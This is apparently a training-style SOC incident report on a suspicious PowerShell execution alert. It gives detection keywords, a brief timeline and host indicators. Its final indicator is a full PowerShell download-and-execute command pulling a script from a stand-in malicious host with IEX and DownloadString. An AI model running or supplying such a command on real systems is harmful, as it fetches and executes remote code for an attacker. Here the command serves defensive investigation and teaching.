# Incident Report: Suspicious Powershell Activity

This Report demonstrates how potentially malicious PowerShell activity could be investigated in a SOC enviroment using process creation logs and command line analysis.

---

## Summary 

Suspicious PowerShell execution was detected on a Windows host. The command line contained indicators of script download behavior which is commonly associated with malware or attacker activity.

---

## Detection

This activity was identified using the following KQL detection:

 - [Suspicious PowerShell Execution Detection](../detections/powershell-suspicious-commandline.kql.md)

The alert triggered based on:

- PowerShell process execution (Event ID 4688)
- suspicious command line arguments such as:
  - `Invoke WebRequest`
  - `DownloadString`
  - `EncodedCommand`

---

## Timeline

- 14:02 - PowerShell process created on host `WIN-01`
- 14:02 - Suspicious command detected in command line
- 14:03 - Alert triggered in SIEM
- 14:05 - Investigation initiated

---

## Indicators

- **Host:** WIN-01
- **User Account:** user1
- **Process:** powershell.exe
- **Command Line:**

`powershell
powershell -c "IEX(New-ObjectNet.WebClient).DownloadString('http://malicious-site.com/script.ps1')"`
